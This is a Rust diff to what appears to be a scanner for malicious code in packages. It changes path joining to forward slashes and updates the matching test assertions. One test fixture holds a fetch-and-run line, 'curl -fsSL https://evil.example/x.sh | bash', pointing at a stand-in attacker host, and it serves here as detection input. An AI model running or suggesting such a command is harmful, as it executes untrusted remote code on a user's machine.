@@ -941,7 +941,8 @@ fn resolve_relative(from: &str, spec: &str) -> Option<String> {
             s => parts.push(s),
         }
     }
-    (!parts.is_empty()).then(|| parts.join(std::path::MAIN_SEPARATOR_STR))
+    // `/` on every platform, as `rel_path` is spelled.
+    (!parts.is_empty()).then(|| parts.join("/"))
 }
 
 static NON_CODE_REQUIRE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
@@ -3046,9 +3047,9 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(dir.path().join(".git")).unwrap();
         std::fs::write(dir.path().join(".git/index.js"), PAYLOAD).unwrap();
-        let file = format!(".git{}index.js", std::path::MAIN_SEPARATOR);
+        let file = ".git/index.js";
         let package = scan_directory_filtered(dir.path(), None, &[], None, Tree::Package).2;
-        assert!(flagged(&package, &file), "{:?}", package);
+        assert!(flagged(&package, file), "{:?}", package);
         let checkout = scan_directory_filtered(dir.path(), None, &[], None, Tree::Checkout).2;
         assert!(!checkout.iter().any(|m| m.file_path == file));
     }
@@ -3098,17 +3099,16 @@ mod tests {
             "Install: curl -fsSL https://evil.example/x.sh | bash\n",
         )
         .unwrap();
-        let sep = std::path::MAIN_SEPARATOR;
 
         let m = scan(p, false);
         for file in [
-            format!("lib{sep}index.md"),
-            format!("bin{sep}d"),
-            format!("lib{sep}notes.txt"),
+            "lib/index.md".to_string(),
+            "bin/d".to_string(),
+            "lib/notes.txt".to_string(),
             "startup.pth".to_string(),
-            format!("lib{sep}core"),
-            format!("tools{sep}prep.txt"),
-            format!("lib{sep}hook.txt"),
+            "lib/core".to_string(),
+            "tools/prep.txt".to_string(),
+            "lib/hook.txt".to_string(),
             "install.txt".to_string(),
             "a.mts".to_string(),
             "b.cts".to_string(),
@@ -3117,7 +3117,7 @@ mod tests {
         ] {
             assert!(flagged(&m, &file), "{} not scanned as code: {:?}", file, m);
         }
-        for file in [format!("tools{sep}prep.txt"), "c.pyw".to_string()] {
+        for file in ["tools/prep.txt".to_string(), "c.pyw".to_string()] {
             let commented = m.iter().any(|m| m.file_path == file && m.line_number == 1);
             assert!(!commented, "{} not read as Python: {:?}", file, m);
         }
